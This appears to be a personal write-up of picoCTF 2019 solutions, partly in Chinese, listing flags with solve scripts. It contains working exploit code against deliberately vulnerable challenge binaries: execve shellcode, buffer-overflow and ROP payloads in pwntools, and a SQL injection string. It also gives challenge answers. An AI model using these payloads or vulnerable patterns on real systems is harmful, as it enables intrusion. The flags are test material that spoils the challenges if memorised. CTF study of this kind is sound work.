# picoctf 2019
# nasm 沒有 ptr
https://hackmd.io/@BEDcPAXbTqKfNoHvW0ZnWw/S16ETnhbH#code22
---

## Glory of the Garden - Points: 50 - (Solves: 2463)Forensics
> strings garden.jpg

picoCTF{more_than_m33ts_the_3y30cAf8c6B}
## 2Warm - Points: 50 - (Solves: 4394)General Skills
picoCTF{101010}


## Insp3ct0r - Points: 50 - (Solves: 3073)Web Exploitation
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?d76327a1}
## Lets Warm Up - Points: 50 - (Solves: 6375)General Skills
picoCTF{p}
## The Numbers - Points: 50 - (Solves: 2550)Cryptography
```python
arr=[3,20,6,20,8,5,14,21,13,2,5,18,19,13,1,19,15,14]
ans=""
for i in range(len(arr)):
        ans+=chr(65+arr[i]-1)
print ans

```
PICOCTF{THENUMBERSMASON}
## Warmed Up - Points: 50 - (Solves: 4821)General Skills
picoCTF{61}
## handy-shellcode - Points: 50 - (Solves: 474)Binary Exploitation
### code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");

  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");

  return 0;
}
```
### payload
```python
from pwn import *
r=process('./shell')
r.recvline('\n')
r.sendline('\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')
r.interactive()
```
picoCTF{h4ndY_d4ndY_sh311c0d3_1442d800}
## practice-run-1 - Points: 50 - (Solves: 1807)Binary Exploitation

picoCTF{g3t_r3adY_2_r3v3r53}
## unzip - Points: 50 - (Solves: 2665)Forensics
picoCTF{unz1pp1ng_1s_3a5y}
## 13 - Points: 100 - (Solves: 2418)Cryptography
picoCTF{not_too_bad_of_a_problem}
## vault-door-training - Points: 50 - (Solves: 2001)Reverse Engineering
picoCTF{w4rm1ng_Up_w1tH_jAv4_f2dd1ba95aa}
## Bases - Points: 100 - (Solves: 2779)General Skills
picoCTF{l3arn_th3_r0p35}
## First Grep - Points: 100 - (Solves: 2776)General Skills
picoCTF{grep_is_good_to_find_things_67edfca5}
## OverFlow 0 - Points: 100 - (Solves: 1054)Binary Exploitation
## code
```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
picoCTF{3asY_P3a5yf663660d}
## Resources - Points: 100 - (Solves: 3034)General Skills
picoCTF{r3source_pag3_f1ag}
## dont-use-client-side - Points: 100 - (Solves: 2746)Web Exploitation
### code
> cat html |grep -G  "'[A-Za-z0-9_{}]*'"

```=html

if (checkpass.substring(0, split) == 'pico') {                            //1
     if (checkpass.substring(split*6, split*7) == '83b1') {               //7
       if (checkpass.substring(split, split*2) == 'CTF{') {               //2
        if (checkpass.substring(split*4, split*5) == 'ts_p') {            //5
         if (checkpass.substring(split*3, split*4) == 'lien') {           //4
           if (checkpass.substring(split*5, split*6) == 'lz_a') {         //6
             if (checkpass.substring(split*2, split*3) == 'no_c') {       //3
               if (checkpass.substring(split*7, split*8) == 'f}') {       //8
```
picoCTF{no_clients_plz_a83b1f}
## logon - Points: 100 - (Solves: 1551)Web Exploitation
### review
modify cookie

picoCTF{th3_c0nsp1r4cy_l1v3s_cb647acd}
## strings it - Points: 100 - (Solves: 2439)General Skills
>strings strings |grep pico

picoCTF{5tRIng5_1T_976fbd5c}


## vault-door-1 - Points: 100 - (Solves: 1667)Reverse Engineering
### code
```
import java.util.*;

class VaultDoor1 {
    public static void main(String args[]) {
        VaultDoor1 vaultDoor = new VaultDoor1();
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter vault password: ");
	String userInput = scanner.next();
	String input = userInput.substring("picoCTF{".length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println("Access granted.");
	} else {
	    System.out.println("Access denied!");
	}
    }

    // I came up with a more secure way to check the password without putting
    // the password itself in the source code. I think this is going to be
    // UNHACKABLE!! I hope Dr. Evil agrees...
    //
    // -Minion #8728
    public boolean checkPassword(String password) {
        return password.length() == 32 &&
               password.charAt(0)  == 'd' &&
               password.charAt(29) == '5' &&
               password.charAt(4)  == 'r' &&
               password.charAt(2)  == '5' &&
               password.charAt(23) == 'r' &&
               password.charAt(3)  == 'c' &&
               password.charAt(17) == '4' &&
               password.charAt(1)  == '3' &&
               password.charAt(7)  == 'b' &&
               password.charAt(10) == '_' &&
               password.charAt(5)  == '4' &&
               password.charAt(9)  == '3' &&
               password.charAt(11) == 't' &&
               password.charAt(15) == 'c' &&
               password.charAt(8)  == 'l' &&
               password.charAt(12) == 'H' &&
               password.charAt(20) == 'c' &&
               password.charAt(14) == '_' &&
               password.charAt(6)  == 'm' &&
               password.charAt(24) == '5' &&
               password.charAt(18) == 'r' &&
               password.charAt(13) == '3' &&
               password.charAt(19) == '4' &&
               password.charAt(21) == 'T' &&
               password.charAt(16) == 'H' &&
               password.charAt(27) == '9' &&
               password.charAt(30) == 'c' &&
               password.charAt(25) == '_' &&
               password.charAt(22) == '3' &&
               password.charAt(28) == 'f' &&
               password.charAt(26) == '2' &&
               password.charAt(31) == 'a';
    }
}
```
改一下
```
ans = []

for i in range(32):
    ans += 'a'
ans[0]= 'd'
ans[29]= '5'
ans[4]= 'r'
ans[2]= '5'
ans[23]= 'r'
ans[3]= 'c'
ans[17]= '4'
ans[1]= '3'
ans[7]= 'b'
ans[10]= '_'
ans[5]= '4'
ans[9]= '3'
ans[11]= 't'
ans[15]= 'c'
ans[8]= 'l'
ans[12]= 'H'
ans[20]= 'c'
ans[14]= '_'
ans[6]= 'm'
ans[24]= '5'
ans[18]= 'r'
ans[13]= '3'
ans[19]= '4'
ans[21]= 'T'
ans[16]= 'H'
ans[27]= '9'
ans[30]= 'c'
ans[25]= '_'
ans[22]= '3'
ans[28]= 'f'
ans[26]= '2'
ans[31]= 'a'

ans = "".join(ans)
print(ans)
```
picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_29f5ca}

## what's a net cat? - Points: 100 - (Solves: 2580)General Skills
picoCTF{nEtCat_Mast3ry_589c8b71}


## where are the robots - Points: 100 - (Solves: 2175)Web Exploitation
picoCTF{ca1cu1at1ng_Mach1n3s_3663c}

## So Meta - Points: 150 - (Solves: 2092)Forensics
### reivew
metadata
picoCTF{s0_m3ta_7ce44fc5}


## extensions - Points: 150 - (Solves: 1969)Forensics
picoCTF{now_you_know_about_extensions}

## First Grep: Part II - Points: 200 - (Solves: 1863)General Skills
> strings */*|grep pico
>
picoCTF{grep_r_to_find_this_fa996158}
## picobrowser - Points: 200 - (Solves: 1557)Web Exploitation

picoCTF{p1c0_s3cr3t_ag3nt_b3785d03}
## vault-door-3 - Points: 200 - (Solves: 944)Reverse Engineering
picoCTF{jU5t_a_sna_3lpm17ga45_u_4_mbrf4c}

## vault-door-3 - Points: 200 - (Solves: 1112)Reverse Engineering
### code
```
import java.util.*;

class VaultDoor3 {
    public static void main(String args[]) {
        VaultDoor3 vaultDoor = new VaultDoor3();
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter vault password: ");
        String userInput = scanner.next();
	String input = userInput.substring("picoCTF{".length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println("Access granted.");
	} else {
	    System.out.println("Access denied!");
        }
    }

    // Our security monitoring team has noticed some intrusions on some of the
    // less secure doors. Dr. Evil has asked me specifically to build a stronger
    // vault door to protect his Doomsday plans. I just *know* this door will
    // keep all of those nosy agents out of our business. Mwa ha!
    //
    // -Minion #2671
    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        char[] buffer = new char[32];
        int i;
        for (i=0; i<8; i++) {
            buffer[i] = password.charAt(i);
        }
        for (; i<16; i++) {
            buffer[i] = password.charAt(23-i);
        }
        for (; i<32; i+=2) {
            buffer[i] = password.charAt(46-i);
        }
        for (i=31; i>=17; i-=2) {
            buffer[i] = password.charAt(i);
        }
        String s = new String(buffer);
        return s.equals("jU5t_a_sna_3lpm17ga45_u_4_mbrf4c");
    }
}

```
翻轉一下
```java
        String password="jU5t_a_sna_3lpm17ga45_u_4_mbrf4c";
        char[] buffer = new char[32];
        int i;
        for (i=0; i<8; i++) {
            buffer[i] = password.charAt(i);
        }
        for (; i<16; i++) {
            buffer[i] = password.charAt(23-i);
        }
        for (; i<32; i+=2) {
            buffer[i] = password.charAt(46-i);
        }
        for (i=31; i>=17; i-=2) {
            buffer[i] = password.charAt(i);
        }
        String s = new String(buffer);
		System.out.println(s);
```
picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_5baf7c}

## where-is-the-file - Points: 200 - (Solves: 1881)General Skills

picoCTF{w3ll_that_d1dnt_w0RK_a871629e}

## vault-door-4 - Points: 250 - (Solves: 1003)Reverse Engineering


picoCTF{jU5t_4_bUnCh_0f_bYt3s_80f8e1e047}

## plumbing - Points: 200 - (Solves: 2791)General Skills
>nc 2019shell1.picoctf.com 21550>trash

picoCTF{digital_plumb3r_8f946c69}

## OverFlow 1 - Points: 150 - (Solves: 1035)Binary Exploitation
### code
```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}

```
### payload
```
from pwn import *
r=process('./o')
r.recvuntil(':')
r.sendline('a'*0x48+'a'*4+p32(0x080485e6))
r.interactive()

```


picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}

## What Lies Within - Points: 150 - (Solves: 2212)Forensics

> use https://stylesuxx.github.io/steganography/

picoCTF{h1d1ng_1n_th3_b1t5}

## caesar - Points: 100 - (Solves: 3147)Cryptography

> shift encode 14  decode 12

picoCTF{crossingtherubiconljmawiae}


## asm1 - Points: 200 - (Solves: 678)Reverse Engineering
### code
```asm
asm1:
	<+0>:	push   ebp
	<+1>:	mov    ebp,esp
	<+3>:	cmp    DWORD PTR [ebp+0x8],0x421
	<+10>:	jg     0x512 <asm1+37>		    not taken    
	<+12>:	cmp    DWORD PTR [ebp+0x8],0x1b4    
	<+19>:	jne    0x50a <asm1+29>          not taken
	<+21>:	mov    eax,DWORD PTR [ebp+0x8]
	<+24>:	add    eax,0x13
	<+27>:	jmp    0x529 <asm1+60>          taken   eax:0x1b4+0x13
	<+29>:	mov    eax,DWORD PTR [ebp+0x8]
	<+32>:	sub    eax,0x13
	<+35>:	jmp    0x529 <asm1+60>
	<+37>:	cmp    DWORD PTR [ebp+0x8],0x7f7
	<+44>:	jne    0x523 <asm1+54>
	<+46>:	mov    eax,DWORD PTR [ebp+0x8]
	<+49>:	sub    eax,0x13
	<+52>:	jmp    0x529 <asm1+60>
	<+54>:	mov    eax,DWORD PTR [ebp+0x8]
	<+57>:	add    eax,0x13
	<+60>:	pop    ebp                       
	<+61>:	ret                             end


1b4==DWORD PTR [ebp+0x8]
```
picoCTF{0x1c7}

##
### review
```
Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3x54ioc1h9}

Yse lncsz bplr-izcarpnzjo dkxnroueius zf g uzlefwpnfmeznn cousex mzwkapr, cfd mgip axtfnj 1467 gj Lkty Bgyeiyyl Argprzn.

Ehk Atgksèce Inahkw ts zmprkkzrk xzmkytmkx narqpd zmp Argprzn Oiyh zr Gqmexyt Cousex.

Ny 1508, Jumlntjd Txnehkrtuy nyvkseej yse yt-narqpd zfmurf ceiyl (a sferoc zf ymtfzjo arusahjes) zmlt ctflj qltkw me g hciznnar hzmvtyety zf zmp Volpnèxj Nivmpr.

Hjwlgxz’s yjnoti moupwez fapkfcej ny 1555 ay f notytnafeius zf zmp fowdt. Zmp lubpr nfwvkx zf zmp arusahjes gwp nub dhokeej wpgaqlrrd, muz yse gqahggpty fyd zmp itipx rjetkwd axj xidjo be rpatx zf g ryestyii ppy vmcayj, hhohs cgs me jnqfkwpnz bttn jlcn hzrxjdpusoety.
```
use online decoder
```
It is interesting how in history people often receive credit for things they did not create

During the course of history, the Vigenère Cipher has been reinvented many times

It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso

For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF{b311a50_0r_v1gn3r3_c1ph3r54ddc1b9}

The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.

The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.

In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.

Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent.

```
picoCTF{b311a50_0r_v1gn3r3_c1ph3r54ddc1b9}


## Easy1 - Points: 100 - (Solves: 3618)Cryptography

picoCTF{CRYPTOISFUN}


##
### code
```
import java.net.URLDecoder;
import java.util.*;

class VaultDoor5 {
   String expected = "JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm"
                        + "JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2"
                        + "JTM0JTVmJTMxJTMxJTM3JTM3JTY2JTM3JTM4JTMz";  

	byte[] decodedBytes = Base64.getDecoder().decode(expected);
    String decodedString = new String(decodedBytes);
	System.out.println(decodedString);
    try {
        String urlString = URLDecoder.decode(decodedString,"UTF-8");
		System.out.println(urlString);
        }
        catch (Exception e)
        {
            // TODO Auto-generated catch block
        }


}

```
picoCTF{c0nv3rt1ng_fr0m_ba5e_64_1177f783}

## vault-door-6 - Points: 350 - (Solves: 1228)Reverse Engineering
### review
java 難用 = = byte 自己xor 出來跟我說它是int
### code
```python=
arr=[0x3b, 0x65, 0x21, 0xa , 0x38, 0x0 , 0x36, 0x1d,
            0xa , 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0xa ,
            0x21, 0x1d, 0x61, 0x3b, 0xa , 0x2d, 0x65, 0x27,
            0xa, 0x34, 0x30, 0x31, 0x30, 0x36, 0x30, 0x31]
ans=""        
for i in range(len(arr)):
    ans += (chr(arr[i] ^ 0x55))
print("".join(ans))
```
picoCTF{n0t_mUcH_h4rD3r_tH4n_x0r_aedeced}


## vault-door-7 - Points: 400 - (Solves: 1020)Reverse Engineering
### review
看懂題意 照它說的步驟 反向操作 就ok
### code
```
arr = [1096770097
,1952395366
,1600270708
,1601398833
,1716808014
,1734293815
,1667379558
, 859191138]
ans = ""
tmp_ans=""
for now in range(len(arr)):
    tmp = bin(arr[now])[2:]
    # print(tmp)
    # print(tmp)
    # print(len(tmp))
    # print(tmp[-8:])
    # print(int(tmp[-8:],2))
    # print(chr(int(tmp[-8:],2)))
    tmp_ans+=chr(int(tmp[-8:],2))
    for i in range(1,4):
        # print(-8*(i+1),-i*8)
        # print(tmp[-8 * (i + 1) : -i * 8])
        # print(chr(int(tmp[-8 * (i + 1) : -i * 8],2)))
        tmp_ans += chr(int(tmp[-8 * (i + 1) : -i * 8], 2))
    ans += tmp_ans[::-1]
    tmp_ans=""

print("".join(ans))

```
picoCTF{A_b1t_0f_b1t_sh1fTiNg_97cb1f367b}


## reverse_cipher - Points: 300 - (Solves: 540)Reverse Engineering
### review
一開始連上遠端 想說為啥程式不給我執行

結果仔細看了code 就是要你逆向
### code
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char flag_data[23]; // [rsp+0h] [rbp-50h]
  char v5; // [rsp+17h] [rbp-39h] dont know what it is
           //                     but I guess is "}"
  int fread_fd; // [rsp+2Ch] [rbp-24h]
  FILE *rev_this_fd; // [rsp+30h] [rbp-20h]
  FILE *flag_fd; // [rsp+38h] [rbp-18h]
  int loop_j; // [rsp+44h] [rbp-Ch]
  int loop_i; // [rsp+48h] [rbp-8h]
  char tmp_char; // [rsp+4Fh] [rbp-1h]

  flag_fd = fopen("flag.txt", "r");
  rev_this_fd = fopen("rev_this", "a");         // a txt file
  if ( !flag_fd )
    puts("No flag found, please make sure this is run on the server");
  if ( !rev_this_fd )
    puts("please run this on the server");
  fread_fd = fread(flag_data, 24uLL, 1uLL, flag_fd);// read 24 read flag
  if ( fread_fd <= 0 )
    exit(0);
  for ( loop_i = 0; loop_i <= 7; ++loop_i )
  {
    tmp_char = flag_data[loop_i];
    fputc(tmp_char, rev_this_fd);
  }
  for ( loop_j = 8; loop_j <= 22; ++loop_j )
  {
    tmp_char = flag_data[loop_j];
    if ( loop_j & 1 )
      tmp_char -= 2;
    else
      tmp_char += 5;
    fputc(tmp_char, rev_this_fd);
  }
  tmp_char = v5;
  fputc(v5, rev_this_fd);
  fclose(rev_this_fd);
  return fclose(flag_fd);
}
```
```c++
#include<iostream>
#include<string>
using namespace std;
int main()
{
	string tmp="w1{1wq8b5.:/f.<";

	for(int a=8;a<=22;++a)
	{

		char q=tmp[a-8];

		if(a&1)
		{
			q+=2;
		}
		else
		{
			q-=5;
		}
		cout<<q;
	}
}

```

picoCTF{r3v3rs3d0051a07}

## like1000 - Points: 250 - (Solves: 2085)Forensics
### code
```shell=
for i in {1000..1};
do
        tar -xvf $i.tar;
done
```
picoCTF{l0t5_0f_TAR5}

## Client-side-again - Points: 200 - (Solves: 3014)Web Exploitation
### code
```jsx=
(function(_0x4bd822, _0x2bd6f7) {
    var _0xb4bdb3 = function(_0x1d68f6) {
        while (--_0x1d68f6) {
            _0x4bd822['push'](_0x4bd822['shift']());
        }
    };
    _0xb4bdb3(++_0x2bd6f7);
}(_0x5a46, 0x1b3));
var _0x4b5b = function(_0x2d8f05, _0x4b81bb) {
    _0x2d8f05 = _0x2d8f05 - 0x0;
    var _0x4d74cb = _0x5a46[_0x2d8f05];
    return _0x4d74cb;
};

function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }                      // _0x4b5b('0x3'))  {n   _0x4b5b('0x4')  oCT   _0x4b5b('0x5')  F{not _0x4b5b('0x6')  _0x4b5b('0x7')
										"picoCTF{"             not_this           0a0d8}               _again_4           this
        }                                 picoCTF{not_this_again_40a0d8}                                                           
    } else {
        alert(_0x4b5b('0x9'));
    }
}
```
picoCTF{not_this_again_40a0d8}

## Open-to-admins - Points: 200 - (Solves: 1835)Web Exploitation
### review
cookies
admin:True
time:1400

picoCTF{0p3n_t0_adm1n5_b6ea8359}

## Irish-Name-Repo 1 - Points: 300 - (Solves: 1629)Web Exploitation
### code
SQL inj 跟去年印模一樣
```
passwd: 1' OR '1'='1
```
picoCTF{s0m3_SQL_93e76603}

## slippery-shellcode - Points: 200 - (Solves: 642)Binary Exploitation
### code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1; //沒有 rand(time)

  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");

  return 0;
}
```
會發現 offset 是 0x68 會跳不上去
用gdb追一下 發現還差 6
```python=
from pwn import *
r=process('./vuln')
raw_input(':')
r.recvline(':')
r.sendline('a'*0x68+'a'*6+'\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')

r.recvline('...')
r.interactive()
```
picoCTF{sl1pp3ry_sh311c0d3_0fb0e7da}
## OverFlow 1 - Points: 150 - (Solves: 1704)Binary Exploitation
### code
```python=
from pwn import *
import time
context.log_level = 'DEBUG'
r=process('./vuln')
raw_input(':')
r.recvuntil(': ')
r.sendline('a'*188+p32(0x080485e6)+'a'*4+p32(0xDEADBEEF)+p32(0xC0DED00D))
#                                  ebp
r.interactive()
```
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
picoCTF{arg5_and_r3turn5f5d490e6}
## asm2 - Points: 250 - (Solves: 917)Reverse Engineering
### code
```asm
asm2:
	<+0>:	push   ebp
	<+1>:	mov    ebp,esp
	<+3>:	sub    esp,0x10
	<+6>:	mov    eax,DWORD PTR [ebp+0xc]
	<+9>:	mov    DWORD PTR [ebp-0x4],eax
	<+12>:	mov    eax,DWORD PTR [ebp+0x8]
	<+15>:	mov    DWORD PTR [ebp-0x8],eax
	<+18>:	jmp    0x50c <asm2+31>
	<+20>:	add    DWORD PTR [ebp-0x4],0x1
	<+24>:	add    DWORD PTR [ebp-0x8],0xaf
	<+31>:	cmp    DWORD PTR [ebp-0x8],0xa3d3
	<+38>:	jle    0x501 <asm2+20>
	<+40>:	mov    eax,DWORD PTR [ebp-0x4]
	<+43>:	leave
	<+44>:	ret
```
分析一下
>ebp+0xc (,this) 0x15
ebp+0x8 (this,) 0xc
ret_addr
pre_ebp <-ebp
ebp-0x4 (,this)   return value
ebp-0x8 (this,)
esp

>32bit f(5,7) push 7 push 5 call f()

>64bit f(5,7) mov esi,7 mov edi,5 call f()

>asm2(0xc,0x15)

```python=
a=0xc
b=0x15
while(a<=0xa3d3):
    a+=0xaf
    b+=1
print(hex(b))
```

```asm
global _start

_start:

    push 0x15
    push 0xc
    call _f
    nop
    leave
    ret
_f:
  push   ebp
	mov    ebp,esp
	sub    esp,0x10
	mov    eax,DWORD  [ebp+0xc]
	mov    DWORD  [ebp-0x4],eax         ; DWORD PTR [ebp-0x4] = DWORD PTR [ebp+0xc]
	mov    eax,DWORD  [ebp+0x8]
	mov    DWORD  [ebp-0x8],eax       ; DWORD PTR [ebp-0x8]= DWORD PTR [ebp+0x8]
	jmp    _buttom                      ; jump
_loop:
	add    DWORD  [ebp-0x4],0x1
	add    DWORD  [ebp-0x8],0xaf
_buttom:
	cmp    DWORD  [ebp-0x8],0xa3d3
	jle    _loop 					 ; smaller or equal will jump
	mov    eax,DWORD  [ebp-0x4]
	leave
	ret

```
> nasm -f elf -o test.o test.asm
> ld -o test test.o -m elf_i386

segfault 正常 用gdb 追一下 答案就出來

picoCTF{0x15}

## droids0 - Points: 300 - (Solves: 378)
### review
apk reverse
一開始直接安裝在手機上面

嗯...按下去沒反應 棒

拆apk 發現 classes.dex/com/hellocmu/picoctf/MainActivity and FlagstaffHill

看到按下按鈕會 把flag 噴在 log

所以執行起來 logcat 看一下

picoCTF{a.moose.once.bit.my.sister}
## NewOverFlow-1 - Points: 200 - (Solves: 447)Binary Exploitation
### code
```
from pwn import *
context.log_level = 'DEBUG'
r=process('./newflow')
raw_input(':')
r.recvuntil(': ')
r.sendline('a'*72+p64(0x4005de)+p64(0x400767))
r.interactive()
```
跳上 flag 在 prinf時 會死掉

xmm 搞鬼 所以在 中間塞個 ret

>ROPgadget --binary newflow|grep "ret"

picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_1a8eb93a}


## NewOverFlow-2 - Points: 250 - (Solves: 362)Binary Exploitation
### review
極度懷疑 這題做壞了

函數沒弄掉 直接上去 塞ret 就這樣

如果照它正常出法 gadget 感覺不大夠

可能要要gdb 下去 set register
### code
```
from pwn import *
context.log_level = 'DEBUG'
r=process('./vuln')
raw_input(':')
r.recvuntil('?')
r.sendline('a'*(64+8)+p64(0x000000000040028d)+p64(0x0040084d))
r.interactive()
```
picoCTF{r0p_1t_d0nT_st0p_1t_3b39d86e}



## whats-the-difference - Points: 200 - (Solves: 2071)General Skills
### code
```
import sys

# Read two files as byte arrays
file1_b = bytearray(open('A://cattos.jpg', 'rb').read())
file2_b = bytearray(open('A://kitters.jpg', 'rb').read())

# Set the length to be the smaller one
size = len(file1_b) if len(file1_b) < len(file2_b) else len(file2_b)
xord_byte_array = bytearray(size)
ans1 = []
ans2 = []
# XOR between the files
for i in range(size):
    if(file1_b[i]!=file2_b[i]):
	    # xord_byte_array[i] = file1_b[i] ^ file2_b[i]
        ans1 += chr(file1_b[i])
        ans2 += chr(file2_b[i])
        # print(file1_b[i] ^ file2_b[i])
    # else:
        # xord_byte_array[i] = file1_b[i]

# Write the XORd bytes to the output file
# open('A://out.jpg', 'wb').write(xord_byte_array)

print(''.join(ans1))
print(''.join(ans2))
```
picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}
## Based - Points: 200 - (Solves: 4815)General Skills
### code
有點髒
```python=
from pwn import *
context.log_level = 'DEBUG'
r=remote('2019shell1.picoctf.com', 28758)
r.recvline()
first=r.recvline()
r.recvuntil(':')
r.sendline(first[:-1])

ans=""
#
# recv="Please give me the  160 151 145 as a word."
recv=r.recvuntil('word.')
r.recvline()
recv = recv.split(' ')[5:-3]
# print(recv)
for i in recv:
    # print(int(i,10))
    ans+=chr(int(i,8)%256)
r.sendline(ans)

##
ans=""
#
# recv="Please give me the  160 151 145 as a word."
recv=r.recvuntil('word.')
r.recvline()
recv = recv.split(' ')[4:-3]
recv= "".join(recv)
# print(type(recv))
# print(recv)
for i in range(0,len(recv),2):
    print(recv[i:i+2])
    # print(int(recv[i,i+2],16))
    ans+=chr(int(recv[i:i+2],16))

r.sendline(ans)
# ans+=chr(165)
# print(type(ans))
# print(ans)
# r.sendline('\x8f\x96\x8d\x97\xa2')
r.interactive()

```
picoCTF{learning_about_converting_values_4b4e293e}

## flag_shop - Points: 300 - (Solves: 1634)General Skills
### review
輸入 int_max

int_max *900 overflow 變 負

pass `if(total_cost <= account_balance)`

